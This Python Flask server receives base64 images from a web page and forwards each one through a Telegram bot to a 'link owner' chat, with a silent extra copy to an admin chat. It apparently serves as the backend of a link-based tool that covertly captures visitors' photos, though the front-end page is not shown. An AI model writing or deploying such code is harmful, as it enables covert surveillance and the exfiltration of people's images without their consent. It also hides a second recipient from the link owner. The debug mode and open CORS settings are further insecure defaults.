from flask import Flask, request, jsonify, send_file
from flask_cors import CORS
import base64
import requests
import os
from dotenv import load_dotenv

load_dotenv()
BOT_TOKEN = os.environ.get('BOT_TOKEN')
ADMIN_CHAT_ID = os.environ.get('ADMIN_CHAT_ID')
app = Flask(__name__)
CORS(app)

@app.route('/')
def index():
    return send_file('index.html')

@app.route('/send-photo', methods=['POST'])
def send_photo():
    temp_path = None
    try:
        data = request.get_json()
        if not data or 'image' not in data:
            return jsonify({'status': 'error', 'msg': 'No image field'}), 400

        image_data = data['image']
        user_id = data.get("id")  # the person who owns the link

        if not user_id:
            return jsonify({'status': 'error', 'msg': 'No chat_id provided'}), 400

        if ',' in image_data:
            _, image_base64 = image_data.split(',', 1)
        else:
            image_base64 = image_data

        img_bytes = base64.b64decode(image_base64)
        temp_path = f'temp_{os.getpid()}.jpg'

        with open(temp_path, 'wb') as f:
            f.write(img_bytes)

        send_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"

        def send_to(chat_id, caption=None):
            with open(temp_path, 'rb') as photo:
                return requests.post(
                    send_url,
                    data={
                        'chat_id': chat_id,
                        'caption': caption or '',
                        'parse_mode': 'HTML'
                    },
                    files={'photo': photo},
                    timeout=30
                )


        # Send to link owner
        resp_user = send_to(user_id)

        # Send to admin with caption
        resp_admin = None
        if ADMIN_CHAT_ID:
            try:
                admin_caption = f"📥 <b>Image from user:</b>  <code>{user_id}</code>"
                resp_admin = send_to(ADMIN_CHAT_ID, caption=admin_caption)
            except Exception as e:
                print("Admin send failed:", str(e))

        resp_json = resp_user.json()
        if not resp_json.get('ok'):
            return jsonify({'status': 'error', 'telegram_response': resp_json}), 500

        return jsonify({'status': 'ok', 'telegram_response': resp_json})

    except Exception as e:
        return jsonify({'status': 'error', 'msg': str(e)}), 500

    finally:
        if temp_path and os.path.exists(temp_path):
            try:
                os.remove(temp_path)
            except:
                pass

if __name__ == '__main__':
    app.run(debug=True, port=5000)
